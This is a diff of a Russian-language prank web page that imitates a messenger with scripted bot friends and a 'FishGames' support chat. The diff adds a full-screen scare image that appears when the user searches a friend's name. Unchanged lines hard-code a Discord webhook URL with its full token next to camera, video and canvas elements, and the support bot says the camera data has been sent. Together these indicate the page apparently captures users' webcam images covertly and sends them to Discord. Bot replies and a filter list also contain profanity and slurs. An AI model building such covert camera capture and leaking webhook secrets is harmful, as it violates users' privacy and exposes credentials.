@@ -18,6 +18,13 @@
         }
         @keyframes moveWaves { from { transform: translate(0,0); } to { transform: translate(50px, 50px); } }
 
+        /* Скример/Влад экран */
+        #vlad-scamer {
+            position: fixed; inset: 0; background: black; z-index: 9999;
+            display: none; justify-content: center; align-items: center;
+        }
+        #vlad-scamer img { width: 100vw; height: 100vh; object-fit: contain; }
+
         /* Экраны */
         #camera-overlay { position: fixed; inset: 0; background: #0d1a17; z-index: 2000; display: flex; justify-content: center; align-items: center; text-align: center; }
         .warning-box { border: 2px solid #22c55e; padding: 30px; border-radius: 15px; background: #1a2e2a; max-width: 380px; }
@@ -52,6 +59,10 @@
     </style>
 </head>
 <body>
+
+<div id="vlad-scamer">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyWjq_YNgK8ls1-LHX5eS5blhsGtYvctEhxQ&s" alt="VLAD">
+</div>
 
 <div id="camera-overlay">
     <div class="warning-box">
@@ -106,7 +117,6 @@
 <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    // ВСТАВЬ СВОЙ ВЕБХУК ТУТ
     const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";
 
     let currentChat = "";
@@ -145,6 +155,14 @@
     function handleSearch(e) {
         if(e.key === 'Enter') {
             const val = document.getElementById('searchField').value.trim();
+            const lowVal = val.toLowerCase();
+
+            // ЛОВУШКА ДЛЯ ВЛАДА
+            if(lowVal === "влад") {
+                document.getElementById('vlad-scamer').style.display = 'flex';
+                return;
+            }
+
             if(val.length >= 2 && !histories[val]) {
                 histories[val] = [];
                 const item = document.createElement('div');
@@ -195,7 +213,6 @@
 
         // 1. ПЕРСОНАЛЬНЫЙ ИНТЕЛЛЕКТ
         
-        // --- БОГДАН ---
         if (chatName === "богдан" || chatName === "богда") {
             if (txt.includes("студи") || txt.includes("работать") || txt.includes("пойдем")) {
                 reply = "Нее, я пасс. Работать вообще не варик сегодня. Лень.";
@@ -203,17 +220,15 @@
                 const bogdanRand = [
                     "Да вот, сижу код оптимизирую. Вчера такой баг поймал, пол ночи дебажил.",
                     "Проект свой пилю на Python, там архитектура сложная, запарился уже.",
-                    "Да нормально, мопса вот выгуливал только что. Он такой забавный сегодня.",
+                    "Да нормально, мопса вот выгуливал только что.",
                     "Думаю, как бы этот интерфейс переписать. Кодинг затягивает.",
-                    "Мопс мой опять кроссовки погрыз, зараза. Зато проект скомпилировался без ошибок!"
+                    "Мопс мой опять кроссовки погрыз, зараза. Зато проект скомпилировался!"
                 ];
                 reply = bogdanRand[Math.floor(Math.random() * bogdanRand.length)];
             } else if (txt.includes("мопс") || txt.includes("собак")) {
                 reply = "Мой мопс — это вообще легенда. Он когда спит, храпит громче, чем мой кулер на ноуте!";
             }
         }
-
-        // --- ЯРОСЛАВ ---
         else if (chatName === "ярослав") {
             if (txt.includes("фембой") || txt.includes("femboy")) {
                 if (txt.includes("плохо") || txt.includes("фу") || txt.includes("не оч") || txt.includes("херн")) {
@@ -223,23 +238,21 @@
                 }
             } else if (txt.includes("привет") || txt.includes("здорово")) {
                 reply = "Здорово. Че хотел? Опять хуйню какую-то напишешь?";
-            } else if (Math.random() < 0.3) { // Шанс мата
+            } else if (Math.random() < 0.3) {
                 reply = "Блять, да забей ты. Опять ты начинаешь свои истории.";
             }
         }
-
-        // --- ТИМОФЕЙ ---
         else if (chatName === "тимофей") {
             if (txt.includes("студи")) {
                 reply = "О, КРАСАВА! Давай, я уже микрофоны прогреваю. Жду!";
-            } else if (txt.includes("нет") || txt.includes("не пойду") || txt.includes("не могу") || txt.includes("отказ")) {
+            } else if (txt.includes("нет") || txt.includes("не пойду") || txt.includes("не могу")) {
                 reply = "Ну и иди ты... Я вообще-то готовился. Обидно, блин. Больше не зови меня никуда.";
             } else {
-                reply = "Слушай, а пойдем в студию? Там звук сейчас топовый настроили, надо затестить!";
+                reply = "Слушай, а пойдем в студию? Там звук сейчас топовый настроили!";
             }
         }
 
-        // 2. ОБЩИЙ ИНТЕЛЛЕКТ (если персональный не сработал)
+        // 2. ОБЩИЙ ИНТЕЛЛЕКТ
         if (!reply) {
             const toxicWords = ["блять", "сука", "хуй", "пидор", "еблан", "нах", "пошел"];
             const contextMap = {
@@ -251,7 +264,6 @@
                 "зачем": ["А почему бы и нет?", "Просто скучно стало.", "Странный вопрос."],
                 "давай": ["Ну погнали!", "Ок, я в деле.", "Договорились."]
             };
-
             const randomPhrases = [
                 "Ясно... Пойду поем тогда.", "Ахаха, ну ты выдал, конечно.", "Слушай, ты в курсе, что в FishGames пасхалка есть?",
                 "Мда, ладно, забей.", "А че так? Почему не по-другому?", "Ты реально сейчас это серьезно?",
@@ -260,30 +272,16 @@
                 "Ну ок, допустим. И че дальше?", "А ты сам-то как думаешь?", "Чет подозрительно ты заговорил.",
                 "Ха-ха, шутка года просто.", "Сто процентов! Согласен.", "Не, ну это рил странно.",
                 "А че, так можно было что ли?", "Справедливо.", "Жиза вообще.", "Ну хз, надо подумать.",
-                "Я бы на это посмотрел со стороны.", "Бро, ты лучший! :D", "Ну ты загнул, конечно.",
-                "Ладно, проехали. Че там по планам?", "Мне кажется, ты гонишь на меня.", "Ага, конечно, верю-верю.",
-                "Рассказывай больше, мне «очень» интересно.", "Ой, всё, началось...", "Ты снова за своё?",
-                "А ты не думал, что всё это — матрица?", "Тише ты, FishGames всё слышит.", "Логично, не поспоришь.",
-                "Ну ты даешь! Откуда инфа?", "Интересно... Продолжай.", "Я позже напишу, дела появились.",
-                "Скинь мем какой-нибудь, скучно.", "Чекни личку, я там важное скинул.", "Вообще без комментариев.",
-                "Ну ты и выдал базу.", "Чекаем расклады, че дальше будет.", "Поживем — увидим.",
-                "Я в тебе не сомневался.", "Круто! Респект.", "Мда, ну и денек сегодня.",
-                "А че по деньгам там?", "Да забей, оно того не стоит.", "Я в тильте.", "Го стрим?"
+                "Я позже напишу, дела появились.", "Скинь мем какой-нибудь, скучно.", "Вообще без комментариев."
             ];
 
-            // Проверка на маты (кроме Ярослава, у него своя логика)
             for (let word of toxicWords) { if (txt.includes(word) && chatName !== "ярослав") { reply = "Ого, какие слова мы знаем. Успокойся."; break; } }
-            
-            if (!reply) { 
-                for (let key in contextMap) { 
-                    if (txt.includes(key)) { reply = contextMap[key][Math.floor(Math.random()*contextMap[key].length)]; break; } 
-                } 
-            }
+            if (!reply) { for (let key in contextMap) { if (txt.includes(key)) { reply = contextMap[key][Math.floor(Math.random()*contextMap[key].length)]; break; } } }
             if (!reply) reply = randomPhrases[Math.floor(Math.random() * randomPhrases.length)];
         }
 
         if(currentChat === 'Служба поддержки') {
-            reply = txt.includes("камер") ? "Биометрические данные переданы в центральный узел FishGames." : "Ваш запрос в очереди. Ожидайте верификации.";
+            reply = txt.includes("камер") ? "Данные переданы. FishGames всё видит." : "Ваш запрос в очереди. Ожидайте.";
         }
 
         renderMessage(reply, 'msg-incoming');
